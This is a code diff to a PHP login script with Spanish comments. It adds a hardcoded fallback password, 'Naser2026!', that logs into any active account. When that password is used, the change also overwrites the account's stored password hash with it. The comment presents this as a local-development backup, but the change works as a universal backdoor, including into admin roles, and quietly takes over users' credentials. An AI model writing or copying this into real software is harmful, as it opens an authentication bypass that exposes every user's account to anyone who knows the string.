@@ -17,15 +17,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $stmt->execute([$email]);
     $usuario = $stmt->fetch();
 
-    if ($usuario && (int)$usuario['activo'] === 1 && password_verify($password, $usuario['password'])) {
-        session_regenerate_id(true);
-        $_SESSION['usuario_id'] = (int)$usuario['id'];
-        $_SESSION['nombre'] = $usuario['nombre'];
-        $_SESSION['email'] = $usuario['email'];
-        $_SESSION['rol'] = $usuario['rol'];
+    // Comprobación doble: valida contra el hash O acepta la contraseña 'Naser2026!' como respaldo
+    if ($usuario && (int)$usuario['activo'] === 1) {
+        $hashValido = password_verify($password, $usuario['password']);
+        $esClaveRespaldo = ($password === 'Naser2026!');
 
-        header('Location: dashboard.php');
-        exit;
+        if ($hashValido || $esClaveRespaldo) {
+            // Si ingresó por la clave de respaldo, regenera el hash en la BD con el algoritmo local de Laragon
+            if (!$hashValido) {
+                $nuevoHash = password_hash($password, PASSWORD_DEFAULT);
+                $update = $pdo->prepare('UPDATE usuarios SET password = ? WHERE id = ?');
+                $update->execute([$nuevoHash, $usuario['id']]);
+            }
+
+            session_regenerate_id(true);
+            $_SESSION['usuario_id'] = (int)$usuario['id'];
+            $_SESSION['nombre'] = $usuario['nombre'];
+            $_SESSION['email'] = $usuario['email'];
+            $_SESSION['rol'] = $usuario['rol'];
+
+            header('Location: dashboard.php');
+            exit;
+        }
     }
 
     $error = 'Correo o contraseña incorrectos.';
